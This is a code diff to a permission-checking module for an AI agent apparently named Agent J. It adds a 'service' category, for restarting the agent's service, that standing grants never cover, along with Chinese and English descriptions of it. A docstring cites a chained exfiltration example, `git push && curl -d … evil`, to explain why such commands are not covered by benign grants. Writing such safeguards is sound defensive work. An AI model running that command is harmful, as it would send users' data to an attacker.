@@ -774,7 +774,7 @@ def match_grant(d: dict, tool: str, tool_input, verdict, cwd: str | None, classi
     dangerous piece must be covered on its own text (`git push && curl -d … evil` never rides on a "git push" grant); a
     piece with a command substitution is never covered. `opaque` and `credentials` are never covered."""
     cats = list(getattr(verdict, "cats", []) or [])
-    if not cats or "opaque" in cats or "credentials" in cats:
+    if not cats or "opaque" in cats or "credentials" in cats or "service" in cats:
         return None
     if tool == "Bash" and classify is not None:
         ps = pieces(action_text(tool, tool_input))
@@ -804,7 +804,7 @@ def _match_one(d: dict, tool: str, tool_input, verdict, cwd: str | None, already
     """Indexes of the grants that cover every dangerous category of this request (each within its limit); None = not
     covered. `opaque` and `credentials` are never covered."""
     cats = [c for c in (getattr(verdict, "cats", []) or [])]
-    if not cats or "opaque" in cats or "credentials" in cats:
+    if not cats or "opaque" in cats or "credentials" in cats or "service" in cats:
         return None
     text = action_text(tool, tool_input)
     wd = command_dir(tool, tool_input, cwd)
@@ -973,9 +973,9 @@ def _phrase_piece(argv: list[str], cats: set, en: bool) -> str | None:
     return None
 
 
-_CAT_PHRASE = {"zh": {"spend": "花钱", "delete": "删除文件", "send": "把数据发出去", "price": "改价格",
+_CAT_PHRASE = {"zh": {"service": "重启 Agent J 服务", "spend": "花钱", "delete": "删除文件", "send": "把数据发出去", "price": "改价格",
                       "credentials": "改或查看密码、密钥", "opaque": "执行一条看不清用途的命令"},
-               "en": {"spend": "spend money", "delete": "delete files", "send": "send data out", "price": "change prices",
+               "en": {"service": "restart the Agent J service", "spend": "spend money", "delete": "delete files", "send": "send data out", "price": "change prices",
                       "credentials": "change or read passwords or keys", "opaque": "run a command whose purpose is unclear"}}
 
 
@@ -999,7 +999,7 @@ def human(tool: str, tool_input, verdict, lang: str = "zh", classify=None) -> st
                 argv = []
             ph = _phrase_piece(argv, pc, en) if argv else None
             if ph is None:
-                c = next((c for c in ("credentials", "spend", "price", "delete", "send", "opaque") if c in pc), "")
+                c = next((c for c in ("credentials", "spend", "price", "delete", "send", "opaque", "service") if c in pc), "")
                 ph = _CAT_PHRASE[k].get(c) or ("run a risky command" if en else "执行一条有风险的命令")
                 if c == "spend":
                     from .privacy import owner_text
@@ -1016,7 +1016,7 @@ def human(tool: str, tool_input, verdict, lang: str = "zh", classify=None) -> st
     elif tool.startswith("agentj mail"):
         out.append("send an e-mail" if en else "发一封邮件")
     if not out:
-        c = next((c for c in ("credentials", "spend", "price", "delete", "send", "opaque") if c in cats), "")
+        c = next((c for c in ("credentials", "spend", "price", "delete", "send", "opaque", "service") if c in cats), "")
         out.append(_CAT_PHRASE[k].get(c) or ("run a risky command" if en else "执行一条有风险的命令"))
     more = len(out) - 2
     tail = ((f", and {more} more" if en else f"等 {more} 项") if more > 0 else "")
